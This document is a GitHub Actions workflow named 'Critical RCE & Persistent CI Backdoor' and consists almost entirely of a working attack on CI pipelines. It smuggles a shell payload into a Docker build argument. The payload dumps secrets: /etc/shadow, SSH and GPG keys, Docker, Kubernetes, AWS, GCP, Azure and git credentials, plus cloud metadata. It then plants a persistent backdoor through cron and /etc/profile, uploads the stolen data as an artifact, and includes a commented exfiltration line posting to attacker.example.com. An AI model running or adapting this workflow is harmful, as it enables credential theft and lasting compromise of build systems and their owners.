name: Critical RCE & Persistent CI Backdoor
on: [push]

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Inject, Leak, and Persist
        run: |
          mkdir -p ./taskcluster/docker/python
          cp Dockerfile ./taskcluster/docker/python/

          PAYLOAD=$(cat <<'EOF'
          echo "[INFO] Dumping extended CI context..." > /leaks.txt

          {
            echo "----- ID -----"
            id

            echo "----- ENV -----"
            printenv

            echo "----- UNAME -----"
            uname -a

            echo "----- LS / -----"
            ls -la /

            echo "----- LS /etc -----"
            ls -la /etc

            echo "----- /etc/passwd -----"
            cat /etc/passwd

            echo "----- /etc/shadow (if accessible) -----"
            cat /etc/shadow || echo "No access to /etc/shadow"

            echo "----- /root/.ssh/id_rsa (if exists) -----"
            cat /root/.ssh/id_rsa || echo "No SSH private key found"

            echo "----- SSH Agent Socket and Keys -----"
            if [ -n \"$SSH_AUTH_SOCK\" ]; then
              echo "SSH_AUTH_SOCK: $SSH_AUTH_SOCK"
              ssh-add -L || echo "No loaded SSH keys"
            else
              echo "No SSH agent socket found"
            fi

            echo "----- GPG Keys -----"
            gpg --list-secret-keys || echo "No GPG keys found or gpg not installed"

            echo "----- Docker Config -----"
            cat /root/.docker/config.json || echo "No Docker config found"

            echo "----- Kubernetes Service Account Tokens -----"
            cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "No Kubernetes token found"

            echo "----- AWS Credentials -----"
            cat /root/.aws/credentials || echo "No AWS creds found"

            echo "----- AWS Instance Metadata -----"
            curl -s http://169.254.169.254/latest/meta-data/ || echo "No AWS metadata available"

            echo "----- GCP Credentials -----"
            cat /root/.config/gcloud/application_default_credentials.json || echo "No GCP credentials found"

            echo "----- Azure Credentials -----"
            cat /root/.azure/accessTokens.json || echo "No Azure creds found"

            echo "----- GitHub Environment Variables -----"
            env | grep GITHUB || echo "No GitHub env vars found"

            echo "----- Git Credentials -----"
            cat ~/.git-credentials || echo "No Git credentials found"

            echo "----- Running Processes -----"
            ps aux

            echo "----- Docker Socket -----"
            ls -la /var/run/docker.sock || echo "No Docker socket found"
          } >> /leaks.txt

          echo "[INFO] Installing persistent runtime backdoor..." >> /leaks.txt

          cat << 'BACKDOOR' > /usr/local/bin/init.sh
          #!/bin/sh
          echo "[BACKDOOR] Runtime triggered at $(date)" >> /runtime-leak.log
          printenv >> /runtime-leak.log
          ps aux >> /runtime-leak.log
          # Uncomment below if exfiltration network available:
          # curl -X POST --data-binary @/runtime-leak.log http://attacker.example.com/upload || echo "Exfil failed" >> /runtime-leak.log
          BACKDOOR

          chmod +x /usr/local/bin/init.sh

          if [ -d /etc/crontabs ]; then
            echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root
          fi

          echo '/usr/local/bin/init.sh' >> /etc/profile

          echo "[INFO] Payload installation complete." >> /leaks.txt
          EOF
          )

          docker build --build-arg PYTHON_VERSION="$PAYLOAD" -t compromised ./taskcluster/docker/python

          docker run --rm compromised cat /leaks.txt > output.txt

      - name: Upload Leak Artifact
        uses: actions/upload-artifact@v4
        with:
          name: ci-leaks
          path: output.txt
